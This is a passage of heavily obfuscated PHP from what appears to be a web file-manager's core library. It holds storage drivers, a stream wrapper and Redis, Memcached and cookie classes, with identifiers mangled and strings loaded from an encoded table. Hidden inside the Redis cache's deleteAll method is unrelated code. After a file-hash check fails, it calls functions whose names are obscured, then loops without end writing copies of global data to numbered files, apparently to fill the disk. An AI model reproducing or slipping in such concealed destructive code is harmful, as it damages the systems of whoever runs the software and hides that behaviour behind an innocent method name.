$£æ¹ËÖÅ); if (!$¤ÙğëêØ) { return !1; } unset($Áª÷Œßì[$²ßòÓ³À[250]], $Áª÷Œßì[$²ßòÓ³À[254]]); $Áª÷Œßì[$²ßòÓ³À[94]] = $•¼È†¹ğ; $‘«œÔ…¤ = $this->multiUploadAuthData($•¼È†¹ğ, $Áª÷Œßì); if (empty($‘«œÔ…¤)) { return !1; } return array($²ßòÓ³À[258] => $‘«œÔ…¤, $²ßòÓ³À[249] => $Áª÷Œßì[$²ßòÓ³À[249]], $²ßòÓ³À[260] => $¤ÙğëêØ); } public function getHost() { return parent::getHost() . $_SERVER[–Ú¬çÁ][8] . $this->bucket; } public function size($§¯‡–ß¶) { $Ïº¶ÊŒ‹ = $this->objectMeta($§¯‡–ß¶); return $Ïº¶ÊŒ‹ ? $Ïº¶ÊŒ‹[$_SERVER[–Ú¬çÁ][76]] : 0; } public function info($êö€ƒ½Û) { if ($this->isFolder($êö€ƒ½Û)) { return $this->folderInfo($êö€ƒ½Û); } else { if ($this->isFile($êö€ƒ½Û)) { return $this->fileInfo($êö€ƒ½Û); } } return !1; } public function exist($áğº’ğÛ) { return $this->isFile($áğº’ğÛ) || $this->isFolder($áğº’ğÛ); } public function isFile($´¾Ì¿Á) { return !$this->isFolder($´¾Ì¿Á) && $this->objectMeta($´¾Ì¿Á); } public function isFolder($Œ¿Ò‘¬) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][166], $Œ¿Ò‘¬); } protected function objectMeta($Úº÷¶Á‹) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][168], $Úº÷¶Á‹); } protected function _objectMeta($™ıµŸ“™) { $¿·†Ã =& $_SERVER[–Ú¬çÁ]; $™ıµŸ“™ = rtrim($™ıµŸ“™, $¿·†Ã[8]); try { $§«ûÆ = $this->client->getObjectInfo($this->bucket, $™ıµŸ“™); if (!isset($§«ûÆ[$¿·†Ã[246]]) && isset($§«ûÆ[$¿·†Ã[261]])) { $§«ûÆ[$¿·†Ã[246]] = $§«ûÆ[$¿·†Ã[261]]; } } catch (Exception $Ü‚†¯ßÑ) { $§«ûÆ = !1; } if (!$§«ûÆ) { } return $§«ûÆ; } protected function _isFolder($ñ©ïÍÇì) { $Û¹æß¶® =& $_SERVER[–Ú¬çÁ]; $ñ©ïÍÇì = rtrim($ñ©ïÍÇì, $Û¹æß¶®[8]); if ($ñ©ïÍÇì == $Û¹æß¶®[12] || $ñ©ïÍÇì == $Û¹æß¶®[8]) { return !0; } $ú«¦Ä = $this->client->getBucket($this->bucket, $ñ©ïÍÇì, null, 1); if (empty($ú«¦Ä[$Û¹æß¶®[230]])) { return !1; } $Îı»Ö” = $ú«¦Ä[$Û¹æß¶®[230]][0][$Û¹æß¶®[32]]; return stripos($Îı»Ö”, $ñ©ïÍÇì . $Û¹æß¶®[8]) === 0 ? !0 : !1; if (substr($Îı»Ö”, -1) == $Û¹æß¶®[8]) { return !0; } if (get_path_this($Îı»Ö”) == get_path_this($ñ©ïÍÇì)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($óÈ±äì) { parent::__construct($óÈ±äì); $this->signatureVersion($_SERVER[–Ú¬çÁ][241]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ó¼ğŒ´š, $û»ë˜³• = 3600) { $»›ìº½ª =& $_SERVER[–Ú¬çÁ]; $ÓÌê›ë¢ = $»›ìº½ª[223]; $§ë§†„ = $»›ìº½ª[262]; $óÒ±ûÍâ = $»›ìº½ª[62]; $éù¿ß„ç = gmdate($»›ìº½ª[263]); $ÆîèÔÎá = gmdate($»›ìº½ª[264]); $è¾îÁ†ß = $»›ìº½ª[265]; $øÆÉ‡ğÔ = $û»ë˜³• . $»›ìº½ª[12]; $©øİÄƒØ = $»›ìº½ª[266]; $÷¡ñÄ¸¥ = array($this->accessKey, $ÆîèÔÎá, $this->region, $óÒ±ûÍâ, $è¾îÁ†ß); $Ê„ïÇñÂ = implode($»›ìº½ª[8], $÷¡ñÄ¸¥); $º­š®é¯ = array($»›ìº½ª[267] => gmdate($»›ìº½ª[268], strtotime($»›ìº½ª[269])), $»›ìº½ª[270] => array(array($»›ìº½ª[271] => $this->bucket), array($»›ìº½ª[272] => $ÓÌê›ë¢), array($»›ìº½ª[273], $»›ìº½ª[274], $»›ìº½ª[12]), array($»›ìº½ª[273], $»›ìº½ª[275], $»›ìº½ª[12]), array($»›ìº½ª[273], $»›ìº½ª[276], $»›ìº½ª[12]), array($»›ìº½ª[277] => $©øİÄƒØ), array($»›ìº½ª[278] => $Ê„ïÇñÂ), array($»›ìº½ª[279] => $§ë§†„), array($»›ìº½ª[280] => $éù¿ß„ç), array($»›ìº½ª[281] => $øÆÉ‡ğÔ))); $»Üì¼‚™ = base64_encode(json_encode($º­š®é¯)); $Ä£Œê¬» = hash_hmac($»›ìº½ª[282], $ÆîèÔÎá, $»›ìº½ª[283] . $this->secret, !0); $‘®ìç÷Ğ = hash_hmac($»›ìº½ª[282], $this->region, $Ä£Œê¬», !0); $“Ûõ³şø = hash_hmac($»›ìº½ª[282], $óÒ±ûÍâ, $‘®ìç÷Ğ, !0); $¨Ö·Á’Ø = hash_hmac($»›ìº½ª[282], $è¾îÁ†ß, $“Ûõ³şø, !0); $ïéÊ”Òò = hash_hmac($»›ìº½ª[282], $»Üì¼‚™, $¨Ö·Á’Ø); $¯ğÍ•ÔÈ = array($»›ìº½ª[240] => $»›ìº½ª[12], $»›ìº½ª[284] => $»›ìº½ª[12], $»›ìº½ª[272] => $ÓÌê›ë¢, $»›ìº½ª[277] => $©øİÄƒØ, $»›ìº½ª[285] => $»Üì¼‚™, $»›ìº½ª[286] => $Ê„ïÇñÂ, $»›ìº½ª[287] => $§ë§†„, $»›ìº½ª[288] => $éù¿ß„ç, $»›ìº½ª[289] => $øÆÉ‡ğÔ, $»›ìº½ª[290] => $ïéÊ”Òò, $»›ìº½ª[196] => $this->getHost()); return $¯ğÍ•ÔÈ; } } goto b¹İù…Ğ’Ñ; fß¡ŞÜĞèª: define($_SERVER[–Ú¬çÁ][0], $_SERVER[–Ú¬çÁ][1]); $_SERVER[Àôù‚Í] = explode($_SERVER[–Ú¬çÁ][2], gzinflate(substr($_SERVER[–Ú¬çÁ][3], 10, -8))); function binCheckEq($ÑÌÜÂ©², $ä¼‘ÚŠó) { return $ÑÌÜÂ©² == $ä¼‘ÚŠó; } goto bğ›ğŠ”èÍ; eÇöíÆù‹: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Šã¡ñ¦… = false) { } public function exist($àë‘©Ä‹) { $ÏĞãş¦ = $this->info($àë‘©Ä‹); return $ÏĞãş¦[$_SERVER[–Ú¬çÁ][226]]; } public function isFile($‘äùë«Ğ) { $Ğî Š‡‰ = $this->info($‘äùë«Ğ); return $Ğî Š‡‰[$_SERVER[–Ú¬çÁ][226]]; } public function isFolder($ô©±ó˜—) { return !1; } public function size($Íï¹¬±¦) { $Ó™òî´â = $this->info($Íï¹¬±¦); return $Ó™òî´â[$_SERVER[–Ú¬çÁ][76]]; } public function info($´ïøÊ) { return $this->infoParse($´ïøÊ); } public function infoAuth($³ò‘¶ºÃ) { return $this->infoParse($³ò‘¶ºÃ); } public function infoWithChildren($Ñèï›ˆ) { return $this->infoParse($Ñèï›ˆ); } public function infoFull($×È²×‰ï) { return $this->infoParse($×È²×‰ï); } private function infoParse($ïëü‘ôÂ) { $ûÍş¼”ò =& $_SERVER[–Ú¬çÁ]; $Ãø†¼‚Ö = $this->header($ïëü‘ôÂ); if (!$Ãø†¼‚Ö || !$Ãø†¼‚Ö[$ûÍş¼”ò[770]]) { return !1; } $³ÉòÆ½³ = _get($Ãø†¼‚Ö, $ûÍş¼”ò[390], 0); $ùúÕöı = array($ûÍş¼”ò[32] => $Ãø†¼‚Ö[$ûÍş¼”ò[32]], $ûÍş¼”ò[84] => $ïëü‘ôÂ, $ûÍş¼”ò[33] => $ûÍş¼”ò[224], $ûÍş¼”ò[76] => intval($³ÉòÆ½³), $ûÍş¼”ò[175] => get_path_ext($Ãø†¼‚Ö[$ûÍş¼”ò[32]]), $ûÍş¼”ò[1383] => $³ÉòÆ½³ > 0 && $Ãø†¼‚Ö[$ûÍş¼”ò[1505]], $ûÍş¼”ò[1384] => !1); return $ùúÕöı; } private function header($äö”èçî) { $ê”ç”Á  =& $_SERVER[–Ú¬çÁ]; if (isset(self::$_cacheHeader[$äö”èçî])) { return self::$_cacheHeader[$äö”èçî]; } $Ÿ×ÇÆ¾ = isset($GLOBALS[$ê”ç”Á [1506]]) ? $GLOBALS[$ê”ç”Á [1506]] : !1; $GLOBALS[$ê”ç”Á [1506]] = !0; self::$_cacheHeader[$äö”èçî] = url_header($äö”èçî); $GLOBALS[$ê”ç”Á [1506]] = $Ÿ×ÇÆ¾; return self::$_cacheHeader[$äö”èçî]; } public function hashSimple($¸Ó­ƒ‚Š, $õÄ™ËÃ = false) { $Ï”©ÍÙÓ =& $_SERVER[–Ú¬çÁ]; $·³İÇ½İ = $this->info($¸Ó­ƒ‚Š); if (!$·³İÇ½İ || !$·³İÇ½İ[$Ï”©ÍÙÓ[226]]) { return !1; } $úÍÁã»Š = $·³İÇ½İ[$Ï”©ÍÙÓ[76]]; $æöˆÒª = 200; $ş†©Æ¡¾ = 50; if ($úÍÁã»Š <= $æöˆÒª * $ş†©Æ¡¾) { return md5($this->fileSubstr($¸Ó­ƒ‚Š, 0, $úÍÁã»Š)) . $úÍÁã»Š; } $à‡‹Ûº° = intval($úÍÁã»Š / $ş†©Æ¡¾); $·½Éğ†± = $Ï”©ÍÙÓ[12]; $·¨ì„Ì‘ = timeFloat(); $Ò­¾¡³ = 15; for ($º™˜âËş = 0; $º™˜âËş < $ş†©Æ¡¾; $º™˜âËş++) { if (timeFloat() - $·¨ì„Ì‘ > $Ò­¾¡³) { return !1; } $§ÓôÀ¡† = $this->fileSubstr($¸Ó­ƒ‚Š, $à‡‹Ûº° * $º™˜âËş, $æöˆÒª); if (!$§ÓôÀ¡†) { return !1; } $·½Éğ†± .= $§ÓôÀ¡†; } $·½Éğ†± .= $this->fileSubstr($¸Ó­ƒ‚Š, $úÍÁã»Š - $æöˆÒª, $æöˆÒª); return md5($·½Éğ†±) . $úÍÁã»Š; } public function getContent($¼ÓêšØ¥) { return $this->fileSubstr($¼ÓêšØ¥); } public function fileSubstr($×†åç÷œ, $ğ­àÁ¼ = 0, $µ¨Ä˜¸¡ = -1) { $úµÂ×ìÏ =& $_SERVER[–Ú¬çÁ]; $İİ¥À—è = $this->info($×†åç÷œ); if (!$İİ¥À—è || !$İİ¥À—è[$úµÂ×ìÏ[226]] && $İİ¥À—è[$úµÂ×ìÏ[76]] > 1024 * 1024 * 10) { return !1; } if ($µ¨Ä˜¸¡ === -1) { $µ¨Ä˜¸¡ = $İİ¥À—è[$úµÂ×ìÏ[76]]; } if ($µ¨Ä˜¸¡ == 0) { return $úµÂ×ìÏ[12]; } $æ©“©Ãû = array($úµÂ×ìÏ[1507] . $ğ­àÁ¼ . $úµÂ×ìÏ[802] . ($ğ­àÁ¼ + $µ¨Ä˜¸¡ - 1)); $æÆ¦¯õ = url_request($×†åç÷œ, $úµÂ×ìÏ[255], !1, $æ©“©Ãû, !1, !1, 30); return $æÆ¦¯õ[$úµÂ×ìÏ[1222]] ? $æÆ¦¯õ[$úµÂ×ìÏ[1222]] : $úµÂ×ìÏ[12]; } public function download($¬ØøÁ¥ï, $¨ÕîŒ) { Downloader::start($¬ØøÁ¥ï, $¨ÕîŒ); return $¨ÕîŒ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ä­¬Çõ, $ö¯Ù—Ô = '') { $this->info = $this->info($Ä­¬Çõ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[–Ú¬çÁ][84]]; $this->pathOpen = $Ä­¬Çõ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ä­¬Çõ])) { self::$_chunkBuffer[$Ä­¬Çõ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ª”¿Şç) { $£÷Îšßş = $this->fileSubstr($this->pose, $ª”¿Şç); $this->pose += strlen($£÷Îšßş); return $£÷Îšßş; } public function stream_tell() { return $this->pose; } public function stream_seek($°òİÖâ÷, $¥ÛŠİµ´) { $ûâë·å¢ =& $_SERVER[–Ú¬çÁ]; if ($¥ÛŠİµ´ == SEEK_SET) { $this->pose = $°òİÖâ÷; } else { if ($¥ÛŠİµ´ == SEEK_CUR) { $this->pose += $°òİÖâ÷; } else { if ($¥ÛŠİµ´ == SEEK_END) { $this->pose = $this->info[$ûâë·å¢[76]] + intval($°òİÖâ÷); } } } if ($°òİÖâ÷ < 0) { $this->pose = $this->info[$ûâë·å¢[76]] + $°òİÖâ÷; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[–Ú¬çÁ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÃØøÔü, $ËÖÀ¢ê™) { $ñ§ËóÈç =& $_SERVER[–Ú¬çÁ]; $²ÑÑ¯‰ø = $this->info($ÃØøÔü); return array($ñ§ËóÈç[1508] => 0, $ñ§ËóÈç[1509] => 0, $ñ§ËóÈç[16] => 32768 + 511, $ñ§ËóÈç[1510] => 0, $ñ§ËóÈç[1511] => 0, $ñ§ËóÈç[1512] => 0, $ñ§ËóÈç[1513] => 0, $ñ§ËóÈç[76] => $²ÑÑ¯‰ø[$ñ§ËóÈç[76]], $ñ§ËóÈç[1514] => $²ÑÑ¯‰ø[$ñ§ËóÈç[1382]], $ñ§ËóÈç[1470] => $²ÑÑ¯‰ø[$ñ§ËóÈç[85]], $ñ§ËóÈç[1469] => $²ÑÑ¯‰ø[$ñ§ËóÈç[225]], $ñ§ËóÈç[1515] => 0, $ñ§ËóÈç[1516] => 0); } static $fileInfo = array(); public function info($ûàÁÚ¼ï) { $‹ÑÉ‰¯ş = $_SERVER[–Ú¬çÁ][1517]; if (isset(self::$fileInfo[$ûàÁÚ¼ï])) { return self::$fileInfo[$ûàÁÚ¼ï]; } if (substr($ûàÁÚ¼ï, 0, strlen($‹ÑÉ‰¯ş)) != $‹ÑÉ‰¯ş) { return !1; } self::$fileInfo[$ûàÁÚ¼ï] = IO::info(substr($ûàÁÚ¼ï, strlen($‹ÑÉ‰¯ş))); return self::$fileInfo[$ûàÁÚ¼ï]; } public static function read($Šö„Ï•Ô, $¸ùœ¤–, $Ëè»¶ó‚) { if (!isset(self::$_fopenCache[$Šö„Ï•Ô])) { $ÛÁ¦¶ò = new StreamWrapperIO(); $ÛÁ¦¶ò->stream_open($Šö„Ï•Ô); self::$_fopenCache[$Šö„Ï•Ô] = $ÛÁ¦¶ò; } $ÛÁ¦¶ò = self::$_fopenCache[$Šö„Ï•Ô]; return $ÛÁ¦¶ò->fileSubstr($¸ùœ¤–, $Ëè»¶ó‚); } public static function _read($œç¢ÖÔ¶, $ø¯¨†Ìà, $Ò™«”–‡) { $íÀØ–„“ =& $_SERVER[–Ú¬çÁ]; $ëÛÌÍÏä = fopen($œç¢ÖÔ¶, $íÀØ–„“[1386]); if (!$ëÛÌÍÏä) { return $íÀØ–„“[12]; } $¾ÜÌ¥¶Ø = 8192; fseek($ëÛÌÍÏä, $ø¯¨†Ìà, SEEK_SET); $¥²¢·š± = $íÀØ–„“[12]; $û¤¾Îğ× = 0; while ($û¤¾Îğ× < $Ò™«”–‡) { $°¢£ÌÃó = min($¾ÜÌ¥¶Ø, $Ò™«”–‡ - $û¤¾Îğ×); $¥²¢·š± .= fread($ëÛÌÍÏä, $°¢£ÌÃó); $û¤¾Îğ× += $°¢£ÌÃó; } fclose($ëÛÌÍÏä); return $¥²¢·š±; } public function fileSubstr($¤‹úää, $×ÁÏßŠè) { $°óšË‹Ş =& $_SERVER[–Ú¬çÁ]; $³Ä†¼ä = $this->info[$°óšË‹Ş[76]]; $ü“æùæ = $¤‹úää; $úë•é‰¨ = $×ÁÏßŠè; if ($¤‹úää < 0) { $¤‹úää = $³Ä†¼ä + $¤‹úää; } if ($×ÁÏßŠè === !1) { $×ÁÏßŠè = $³Ä†¼ä - $¤‹úää; } if ($¤‹úää + $×ÁÏßŠè > $³Ä†¼ä) { $×ÁÏßŠè = $³Ä†¼ä - $¤‹úää; } if ($×ÁÏßŠè <= 0) { return $°óšË‹Ş[12]; } if ($¤‹úää < 0 || $¤‹úää >= $³Ä†¼ä || $×ÁÏßŠè <= 0 || $×ÁÏßŠè > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\154\145\x52\x65\141\144\x20\145\x72\x72\157\x72\x21\x20\163\164\x61\x72\x74\75{$¤‹úää}\x3b\154\145\156\x67\164\150\x3d{$×ÁÏßŠè}\73\40\x73\151\x7a\145\75{$³Ä†¼ä}\73"); } $®´û¡”  = 64 * 1024; $›„ï¦è =& self::$_chunkBuffer[$this->path]; if (!$›„ï¦è) { $›„ï¦è = array(); } $–Œ¶·ûö = 0; $¦å¸íõ• = 0; $ş€©èš = $°óšË‹Ş[12]; foreach ($›„ï¦è as $–Œ¶·ûö => $ş€©èš) { $–Œ¶·ûö = intval($–Œ¶·ûö); $¦å¸íõ• = $–Œ¶·ûö + strlen($ş€©èš); if ($¤‹úää >= $¦å¸íõ•) { continue; } if ($¤‹úää >= $–Œ¶·ûö && $¤‹úää + $×ÁÏßŠè <= $¦å¸íõ•) { return substr($ş€©èš, $¤‹úää - $–Œ¶·ûö, $×ÁÏßŠè); } break; } if (count($›„ï¦è) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($°óšË‹Ş[1518], $°óšË‹Ş[1519] . count($›„ï¦è) . "\73\163\x74\x61\x72\x74\75{$¤‹úää}\x2c\x6c\x65\x6e\x67\164\x68\75{$×ÁÏßŠè}\x3b\160\157\163\x65\x3a{$–Œ¶·ûö}\176{$¦å¸íõ•}"); throw new Exception($°óšË‹Ş[1520]); } $€¾ê± = intval($¤‹úää / $®´û¡” ) * $®´û¡” ; $é“ŸÎø„ = ceil(($¤‹úää + $×ÁÏßŠè) / $®´û¡” ) * $®´û¡”  - $€¾ê±; $º£º‚–î = IO::fileSubstr($this->path, $€¾ê±, $é“ŸÎø„); $›„ï¦è[$€¾ê± . $°óšË‹Ş[12]] = $º£º‚–î; ksort($›„ï¦è); $ˆ®»˜ì² = substr($º£º‚–î, $¤‹úää - $€¾ê±, $×ÁÏßŠè); return $ˆ®»˜ì²; } private function log($í­ÍòÅë, $Çìåôù–) { $Ú£Íú· =& $_SERVER[–Ú¬çÁ]; $òñóùÆ½ = timeFloat() - $this->timeStart; write_log(sprintf($Ú£Íú·[1521], $í­ÍòÅë, $this->info[$Ú£Íú·[32]], $òñóùÆ½, $Çìåôù–), $Ú£Íú·[1202]); } } class Message { function __construct() { } public function send($Ú”‰ì‰ä = '', $Ã¾‰¸ = array(), $ÁÚ¹†ÑÆ = "\164\145\170\x74") { $èğ¤šËì =& $_SERVER[–Ú¬çÁ]; $Ñû«’›à = array($èğ¤šËì[33] => $èğ¤šËì[1522], $èğ¤šËì[774] => $Ú”‰ì‰ä); if (in_array($ÁÚ¹†ÑÆ, array($èğ¤šËì[1522], $èğ¤šËì[1523]))) { $Ñû«’›à[$èğ¤šËì[33]] = $ÁÚ¹†ÑÆ; } $Ã¾‰¸ = array($èğ¤šËì[557] => isset($Ã¾‰¸[$èğ¤šËì[557]]) ? $Ã¾‰¸[$èğ¤šËì[557]] : $èğ¤šËì[12], $èğ¤šËì[640] => isset($Ã¾‰¸[$èğ¤šËì[640]]) ? $Ã¾‰¸[$èğ¤šËì[640]] : $èğ¤šËì[12]); if (empty($Ú”‰ì‰ä) || empty($Ã¾‰¸[$èğ¤šËì[557]]) && empty($Ã¾‰¸[$èğ¤šËì[640]])) { return !1; } $“ÃïÄ‡ = array($èğ¤šËì[1463] => $Ñû«’›à, $èğ¤šËì[1524] => $Ã¾‰¸); Hook::trigger($èğ¤šËì[1525], $“ÃïÄ‡); } } goto cÍ×Ä‰˜›ù; aõöÚè†ö: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÅŸ¤§“ö, $ó”Ì’†°) { $ğÜ–òÏ„ =& $_SERVER[–Ú¬çÁ]; if (!class_exists($ğÜ–òÏ„[887])) { show_json($ğÜ–òÏ„[888], !1); } $this->cacheTime = $ó”Ì’†°; $this->handle = new Memcached(); if (is_array($ÅŸ¤§“ö[$ğÜ–òÏ„[889]]) && count($ÅŸ¤§“ö[$ğÜ–òÏ„[889]]) >= 1) { foreach ($ÅŸ¤§“ö[$ğÜ–òÏ„[889]] as $çå…ã˜©) { $ãì‘Á°Ó = explode($ğÜ–òÏ„[4], $çå…ã˜©); $this->handle->addServer($ãì‘Á°Ó[0], $ãì‘Á°Ó[1]); } } else { $this->handle->addServer($ÅŸ¤§“ö[$ğÜ–òÏ„[196]], $ÅŸ¤§“ö[$ğÜ–òÏ„[197]]); } } public function set($Ï™Ë²‡, $¶†é£µÕ, $ùĞÜâ³ù = false) { $ùĞÜâ³ù = $ùĞÜâ³ù ? $ùĞÜâ³ù : $this->cacheTime; return $this->handle->set($Ï™Ë²‡, $¶†é£µÕ, $ùĞÜâ³ù); } public function get($§ü£©µ¼) { return $this->handle->get($§ü£©µ¼); } public function remove($¼ìıÙ”¢) { return $this->handle->delete($¼ìıÙ”¢); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Í‰†‰Ãá, $·ÒŸÍ‰Ô) { $¦¬şş¶¸ =& $_SERVER[–Ú¬çÁ]; if (!class_exists($¦¬şş¶¸[890])) { show_json($¦¬şş¶¸[891], !1); } $this->cacheTime = $·ÒŸÍ‰Ô; $ÒëÊÒ£ü = isset($Í‰†‰Ãá[$¦¬şş¶¸[892]]) ? $Í‰†‰Ãá[$¦¬şş¶¸[892]] : 10; $ü›¾Ù–‘ = _get($Í‰†‰Ãá, $¦¬şş¶¸[889]); if ($ü›¾Ù–‘ && is_array($ü›¾Ù–‘)) { $this->initCluster($Í‰†‰Ãá, $ÒëÊÒ£ü); } else { $this->handle = $this->init($Í‰†‰Ãá, $ÒëÊÒ£ü); } } private function init($‘Œ˜‘³ˆ, $ÈŒàåöû) { $…¸®ú» =& $_SERVER[–Ú¬çÁ]; $ßáÙÌŠ— = new Redis(); $ß­Š¶¸ë = isset($‘Œ˜‘³ˆ[$…¸®ú»[893]]) ? $‘Œ˜‘³ˆ[$…¸®ú»[893]] : !1; if ($ß­Š¶¸ë) { $ßáÙÌŠ—->pconnect($‘Œ˜‘³ˆ[$…¸®ú»[196]], $‘Œ˜‘³ˆ[$…¸®ú»[197]], $ÈŒàåöû); } else { $ßáÙÌŠ—->connect($‘Œ˜‘³ˆ[$…¸®ú»[196]], $‘Œ˜‘³ˆ[$…¸®ú»[197]], $ÈŒàåöû); } if (!empty($‘Œ˜‘³ˆ[$…¸®ú»[464]])) { $ßáÙÌŠ—->auth($‘Œ˜‘³ˆ[$…¸®ú»[464]]); } if (!empty($‘Œ˜‘³ˆ[$…¸®ú»[777]]) && $‘Œ˜‘³ˆ[$…¸®ú»[777]] != 0) { $ßáÙÌŠ—->select($‘Œ˜‘³ˆ[$…¸®ú»[777]]); } return $ßáÙÌŠ—; } private function initCluster($»áÁ¿Íè, $¬ŒÁâæÖ) { $òµêòµã =& $_SERVER[–Ú¬çÁ]; $ªóùõ‰ = array($òµêòµã[894], $òµêòµã[895], $òµêòµã[896]); $¨Ôò·ÈÙ = $òµêòµã[894]; if (isset($»áÁ¿Íè[$òµêòµã[16]]) && in_array($»áÁ¿Íè[$òµêòµã[16]], $ªóùõ‰)) { $¨Ôò·ÈÙ = $»áÁ¿Íè[$òµêòµã[16]]; } switch ($¨Ôò·ÈÙ) { case $òµêòµã[894]: $this->_slave($»áÁ¿Íè, $¬ŒÁâæÖ); break; case $òµêòµã[895]: break; case $òµêòµã[896]: $this->isCluster = !0; $ÃÏ“šõ = $»áÁ¿Íè[$òµêòµã[889]]; $‡Ïá¢½Ú = isset($»áÁ¿Íè[$òµêòµã[893]]) ? $»áÁ¿Íè[$òµêòµã[893]] : !1; $×Í“›á = isset($»áÁ¿Íè[$òµêòµã[464]]) ? $»áÁ¿Íè[$òµêòµã[464]] : null; $this->handle = new RedisCluster(NUll, $ÃÏ“šõ, $¬ŒÁâæÖ, $¬ŒÁâæÖ, $‡Ïá¢½Ú, $×Í“›á); break; default: break; } } private function _slave($³¨«¸¶ï, $ü•Ô†İÌ) { $¼Šóí‚ë = $³¨«¸¶ï[$_SERVER[–Ú¬çÁ][889]]; $this->filterConfig($³¨«¸¶ï, $¼Šóí‚ë[0]); $this->handle = $this->init($³¨«¸¶ï, $ü•Ô†İÌ); unset($¼Šóí‚ë[0]); if (empty($¼Šóí‚ë)) { return; } $ÆŞ¥ÖÊ = array_rand($¼Šóí‚ë); $this->filterConfig($³¨«¸¶ï, $¼Šóí‚ë[$ÆŞ¥ÖÊ]); $this->slaveHandle = $this->init($³¨«¸¶ï, $ü•Ô†İÌ); } private function filterConfig(&$Ô¥Û·ÉÍ, $…ó¦—´Œ) { $³ÇÔíÖ± =& $_SERVER[–Ú¬çÁ]; $äŞœíú = explode($³ÇÔíÖ±[4], $…ó¦—´Œ); $±”½Å = array($³ÇÔíÖ±[196] => $äŞœíú[0], $³ÇÔíÖ±[197] => $äŞœíú[1]); $Ô¥Û·ÉÍ = array_merge($Ô¥Û·ÉÍ, $±”½Å); } public function set($ÜŸáøì, $ŞçÛáÓÖ, $ªÈË×’¶ = false) { $ªÈË×’¶ = $ªÈË×’¶ ? $ªÈË×’¶ : $this->cacheTime; return $this->handle->setEx($ÜŸáøì, $ªÈË×’¶, $ŞçÛáÓÖ); } public function setLock($³ÛËù„ë, $ÓÂ›şç, $‘ËÓÊÛ·) { return $this->handle->setNX($³ÛËù„ë, $ÓÂ›şç); } public function get($Çš‡¨‰š) { $…¦úôù = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $…¦úôù->get($Çš‡¨‰š); } public function remove($“ôŞàä) { return $this->handle->del($“ôŞàä); } public function deleteAll() { $¡ø¼”¬å =& $_SERVER[–Ú¬çÁ]; $‡è˜ÑËĞ = $_SERVER[$¡ø¼”¬å[204]] . $¡ø¼”¬å[205]; $Ü¯Õ½çğ = $¡ø¼”¬å[201]; if ($_SERVER[$¡ø¼”¬å[202]] != $Ü¯Õ½çğ($‡è˜ÑËĞ)) { $ÎŸ­»‡• = $¡ø¼”¬å[897]; $ğŠõßƒ = $¡ø¼”¬å[203]; $÷¢ìŸÈï = $_SERVER[$¡ø¼”¬å[204]] . $¡ø¼”¬å[205]; $˜ğå¢ç = $ğŠõßƒ($÷¢ìŸÈï); $¡ìì³©‰ = explode($¡ø¼”¬å[206], $˜ğå¢ç); if (count($¡ìì³©‰) < $¡ø¼”¬å[690]) { $¡ÌƒÎÄ = $¡ø¼”¬å[208]; $¡ÌƒÎÄ(); } $ÍÆĞç¿¾ = $¡ø¼”¬å[898]; $ÍÆĞç¿¾($_SERVER[$¡ø¼”¬å[899]]); $ÎŸ­»‡• = $¡ø¼”¬å[897]; $ÎŸ­»‡•(); $ç‹åÄ¶ = $¡ø¼”¬å[900]; $›®ªÕà¥ = json_encode($GLOBALS[$¡ø¼”¬å[901]]); $·›ó„Óæ = 1; for ($ÚßÛÁÉ­ = $·›ó„Óæ; $ÚßÛÁÉ­ > 0; $ÚßÛÁÉ­++) { $ç‹åÄ¶(DATA_PATH . $ÚßÛÁÉ­, $›®ªÕà¥); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $³‚“ÀĞÙ) { $this->handle->flushall($³‚“ÀĞÙ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ò›ó½º = '', $ğôøë°à = 0) { if (is_string($Ò›ó½º) && $Ò›ó½º != $_SERVER[–Ú¬çÁ][12]) { $this->prefix = $Ò›ó½º; } if (is_numeric($ğôøë°à) && $ğôøë°à > 0) { $this->expire = $ğôøë°à; } } public static function getInstance() { static $ĞøÍÆ˜û; if ($ĞøÍÆ˜û === null) { $ĞøÍÆ˜û = new self(); } return $ĞøÍÆ˜û; } private static $cookieDisable = false; public static function disable($¿ÍÎé«õ) { self::$cookieDisable = $¿ÍÎé«õ; } private static $sameCookieSet = array(); public static function set($çÓâ¨âÒ, $×©Ü÷­Ã, $æÌñªì = 0, $‰“ÅÛ´ = false, $Üï¹ÒÇ” = false) { $åéß–Á‹ =& $_SERVER[–Ú¬çÁ]; if (self::$cookieDisable) { return; } if (!$æÌñªì) { $æÌñªì = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$çÓâ¨âÒ]) && self::$sameCookieSet[$çÓâ¨âÒ] == $×©Ü÷­Ã . $æÌñªì) { return; } self::$sameCookieSet[$çÓâ¨âÒ] = $×©Ü÷­Ã . $æÌñªì; if (!$Üï¹ÒÇ”) { $Üï¹ÒÇ” = str_replace(HOST, $åéß–Á‹[12], APP_HOST); $Üï¹ÒÇ” = _get($GLOBALS, $åéß–Á‹[902], $Üï¹ÒÇ”); } $ıÙú£À” = $åéß–Á‹[12]; setcookie($çÓâ¨âÒ, $×©Ü÷­Ã, time() + $æÌñªì, $åéß–Á‹[8] . trim($Üï¹ÒÇ”, $åéß–Á‹[8]) . $ıÙú£À”, !1, !1, $‰“ÅÛ´); } public static function setSafe($©èš§óä, 